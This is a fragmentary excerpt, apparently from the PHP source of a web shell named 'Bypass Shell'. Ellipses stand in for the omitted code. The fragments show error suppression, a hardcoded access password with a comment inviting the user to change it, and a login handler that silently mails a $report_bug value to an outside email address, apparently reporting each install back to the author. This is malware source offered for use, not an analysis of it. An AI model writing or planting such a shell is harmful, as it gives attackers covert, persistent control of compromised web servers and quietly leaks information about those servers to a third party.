...
error_reporting(0);
	...
	$gcw = "getcwd";
	$correctPassword = "sayasukabokep"; //Change Password
	if (isset($_POST['pass'])) {
...
<center>
	<br><br><br><br>
<font face="Bungee" size="5">Bypass Shell</font></center>
...
function author() {
	echo "<center><br>Bypass Shell</center>";
	exit();
}
...
if (array_key_exists('loginin', $_POST)) {
		...
		@mail('ryouxploit@gmail.com', 'Hehehe', $report_bug);
		}
